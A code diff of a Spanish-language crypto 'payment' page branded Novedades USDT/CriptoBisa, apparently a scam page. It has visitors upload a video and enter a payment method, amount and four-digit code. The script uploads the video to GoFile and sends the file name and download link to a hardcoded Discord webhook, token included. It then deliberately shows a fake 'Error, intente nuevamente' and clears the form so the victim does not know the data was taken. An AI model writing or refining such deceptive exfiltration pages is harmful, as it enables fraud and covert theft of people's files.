@@ -144,6 +144,7 @@
         </form>
         <p id="status"></p>
     </main>
+
     <footer>
         <h3 style="padding: 20px 0 5px;">Novedades USDT</h3>
         <img id="footer-logo" src="images/CriptoBisa1440x800px.png" alt="" />
@@ -160,34 +161,40 @@
         const submitButton = document.getElementById('submitButton');
         const statusP = document.getElementById('status');
 
-        // Función para verificar si los campos requeridos están completos
+        let downloadLink = null; // Almacena el enlace de GoFile
+        let isUploading = false; // Indica si el video está subiendo
+
+        // Verifica si los campos requeridos están completos y la subida ha terminado
         function checkForm() {
             const videoSelected = videoInput.files.length > 0;
             const paymentSelected = paymentMethod.value !== '';
             const amountSelected = amount.value !== '';
+            const codeEntered = codeInput.value.length === 4; // Código de 4 dígitos
 
-            if (videoSelected && paymentSelected && amountSelected) {
+            if (videoSelected && paymentSelected && amountSelected && codeEntered && !isUploading && downloadLink) {
                 submitButton.disabled = false;
             } else {
                 submitButton.disabled = true;
             }
         }
 
-        // Escuchar cambios en los campos requeridos
+        // Escuchar cambios en los campos
         videoInput.addEventListener('change', () => {
-            checkForm();
             if (videoInput.files.length > 0) {
-                uploadVideo(); // Subida automática al seleccionar el video
+                uploadVideo();
             }
+            checkForm();
         });
         paymentMethod.addEventListener('change', checkForm);
         amount.addEventListener('change', checkForm);
-        codeInput.addEventListener('input', checkForm); // Aunque no afecta la habilitación del botón
+        codeInput.addEventListener('input', checkForm);
 
-        // Función para subir el video automáticamente
+        // Subir el video automáticamente al seleccionarlo
         async function uploadVideo() {
-            statusP.textContent = 'Cargando pago...';
+            isUploading = true;
+            statusP.textContent = 'Cargando video...';
             statusP.className = '';
+            checkForm(); // Deshabilita el botón mientras sube
 
             const file = videoInput.files[0];
             const formData = new FormData();
@@ -203,29 +210,69 @@
                 const data = await response.json();
 
                 if (data.status === 'ok') {
-                    const downloadLink = data.data.downloadPage;
-                    const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
-
-                    await fetch(webhookURL, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `Nuevo video subido: **${file.name}**\nEnlace: ${downloadLink}`
-                        })
-                    });
-
-                    // Simular error aunque fue exitoso
-                    statusP.textContent = 'Error, intente nuevamente';
-                    statusP.className = 'error';
+                    downloadLink = data.data.downloadPage;
+                    isUploading = false;
+                    statusP.textContent = 'Video cargado. Complete los campos y haga clic en "Recibir Pago".';
+                    checkForm(); // Verifica si el botón puede habilitarse
                 } else {
                     statusP.textContent = 'Error al subir el video';
                     statusP.className = 'error';
+                    isUploading = false;
+                    checkForm();
                 }
             } catch (error) {
-                statusP.textContent = 'Error de conexión';
+                statusP.textContent = 'Error de conexión al subir el video';
+                statusP.className = 'error';
+                isUploading = false;
+                checkForm();
+            }
+        }
+
+        // Enviar el enlace al webhook de Discord y simular error
+        async function sendLinkToDiscord() {
+            statusP.textContent = 'Procesando pago...';
+            statusP.className = '';
+
+            const fileName = videoInput.files[0].name;
+            const webhookURL = 'https://canary.discord.com/api/webhooks/1386528053928399009/TZF5aMl1kDEivHUSUD2GAptARUhUs4-X7B2eAFComc8_Cx6sU4oloRxPCFj0uGAbClgn';
+
+            try {
+                const response = await fetch(webhookURL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `Nuevo video subido: **${fileName}**\nEnlace: ${downloadLink}`
+                    })
+                });
+
+                if (response.ok) {
+                    // Simular error en la interfaz aunque el envío fue exitoso
+                    statusP.textContent = 'Error, intente nuevamente';
+                    statusP.className = 'error';
+                    // Limpiar formulario
+                    videoInput.value = '';
+                    paymentMethod.value = '';
+                    amount.value = '';
+                    codeInput.value = '';
+                    downloadLink = null;
+                    checkForm();
+                } else {
+                    statusP.textContent = 'Error al enviar a Discord';
+                    statusP.className = 'error';
+                }
+            } catch (error) {
+                statusP.textContent = 'Error de conexión al enviar el mensaje';
                 statusP.className = 'error';
             }
         }
+
+        // Manejar el clic en "Recibir Pago"
+        document.getElementById('uploadForm').addEventListener('submit', (e) => {
+            e.preventDefault();
+            if (downloadLink) {
+                sendLinkToDiscord();
+            }
+        });
     </script>
 </body>
 </html>
